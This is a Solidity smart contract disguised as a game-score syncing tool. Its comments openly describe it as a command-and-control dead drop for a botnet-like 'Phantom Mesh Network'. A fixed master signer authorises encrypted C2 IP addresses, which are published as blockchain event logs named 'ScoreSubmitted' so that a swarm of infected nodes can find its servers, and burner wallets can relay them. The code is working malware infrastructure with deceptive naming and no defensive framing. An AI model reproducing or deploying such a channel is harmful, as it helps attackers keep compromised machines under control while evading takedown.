// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title GameScoreSync (Phantom C2 Channel)
 * @dev Deployed on Sepolia Testnet.
 *      Acts as a Dead Drop mechanism for Phantom Mesh Network.
 *      Uses Event Logs for cheap data storage.
 *      PARANOID MODE: Immutable Signer, No Update Function.
 */
contract GameScoreSync {
    address public immutable trustedSigner;

    /**
     * @dev The Beacon Event.
     * @param magic_id Used to filter noise (like a Session ID or Protocol Magic).
     * @param payload Contains the Encrypted + Signed IP Address.
     *        Struct: [Magic(4)][IV(12)][Data(N)][Sig(64)]
     */
    event ScoreSubmitted(uint256 indexed magic_id, bytes payload);

    constructor(address _signer) {
        require(_signer != address(0), "Invalid Signer");
        trustedSigner = _signer;
    }

    /**
     * @notice Broadcasts a new C2 location to the Swarm.
     * @dev REQUIREMENT: Payload must be signed by 'trustedSigner' (Master).
     *      This prevents Griefing/Spam attacks on the Event Log.
     *      Any wallet (Burner) can submit the transaction/pay gas, 
     *      as long as they possess the valid signature.
     * 
     * @param magic_id The identifier for the current mesh network.
     * @param payload The encrypted IP address.
     * @param v ECDSA Signature recovery id.
     * @param r ECDSA Signature output r.
     * @param s ECDSA Signature output s.
     */
    function submitScore(
        uint256 magic_id, 
        bytes calldata payload,
        uint8 v, bytes32 r, bytes32 s
    ) external {
        // 1. Reconstruct Message Hash
        bytes32 messageHash = keccak256(abi.encodePacked(magic_id, payload));
        
        // 2. Apply Ethereum Signed Message Prefix
        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );

        // 3. Recover Signer
        address recoveredSigner = ecrecover(ethSignedMessageHash, v, r, s);
        
        // 4. Verify Identity
        require(recoveredSigner == trustedSigner, "Invalid Signature: Source Unverified");
        require(recoveredSigner != address(0), "Invalid Signature: Zero Address");

        // 5. Emit Log (Only if Verified)
        emit ScoreSubmitted(magic_id, payload);
    }
}
